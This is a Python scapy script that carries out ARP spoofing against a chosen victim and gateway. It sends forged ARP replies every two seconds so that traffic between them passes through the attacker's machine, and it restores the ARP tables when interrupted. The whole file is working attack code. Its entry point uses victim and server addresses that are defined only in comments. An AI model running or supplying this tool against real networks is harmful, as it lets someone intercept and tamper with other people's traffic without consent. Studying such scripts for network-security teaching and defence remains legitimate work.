from scapy.all import ARP, Ether, conf, getmacbyip, get_if_hwaddr, get_if_addr, send, sendp

import time
import random as rd

# macVictim = "ff:ff:ff:ff:ff:ff"
# ipVictim = "192.168.178.144"

# macServer = "ff:ff:ff:ff:ff:ff"
# ipServer = "192.168.178.1"

def MIMspoofARP(ipVictim, ipServer):
    interface = conf.iface

    macAttacker = get_if_hwaddr(interface)
    ipAttacker = get_if_addr(interface)
    
    macVictim = getmacbyip(ipVictim)
    macServer = getmacbyip(ipServer)

    print(f'ipVictim={ipVictim}, macVictim={macVictim}, ipServer={ipServer}, macServer={macServer}')

    arpTo = Ether() / ARP()
    arpTo[Ether].src = macAttacker
    arpTo[ARP].hwsrc = macAttacker
    arpTo[ARP].psrc = ipServer
    arpTo[ARP].hwdst = macVictim
    arpTo[ARP].pdst = ipVictim

    arpFrom = Ether() / ARP()
    arpFrom[Ether].src = macAttacker
    arpFrom[ARP].hwsrc = macAttacker
    arpFrom[ARP].psrc = ipVictim
    arpFrom[ARP].hwdst = macServer
    arpFrom[ARP].pdst = ipServer

    # arp1 = prepPacket(macServer, ipServer, ipVictim)
    # arp2 = prepPacket(macVictim, ipVictim, ipServer)

    print("Starting ARP poisoning")

    try:
        while(True):

            sendp(arpTo, iface=interface, verbose=False)
            sendp(arpFrom, iface=interface, verbose=False)

            # send(Ether(dst=macServer), arp1, verbose=False)
            # send(Ether(dst=macVictim), arp2, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Undoing ARP poisoning")
        undoARPSpoof(ipVictim, ipServer, macVictim, macServer, macAttacker, interface)


def undoARPSpoof(ipVictim, ipServer, macVictim, macServer, macAttacker, interface):
    undoVictim = Ether(src = macAttacker) / ARP(hwsrc=macVictim, psrc=ipVictim, hwdst=macServer, pdst=ipServer)
    undoServer = Ether(src = macAttacker) / ARP(hwdst=macVictim, pdst=ipVictim, hwsrc=macServer, psrc=ipServer)

    sendp(undoVictim, iface=interface, verbose=False)
    sendp(undoServer, iface=interface, verbose=False)

# def prepPacket(targetMAC, targetIP, spoofedIP):
#     arp1 = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofedIP)

if __name__ == "__main__":
    MIMspoofARP(ipVictim, ipServer)


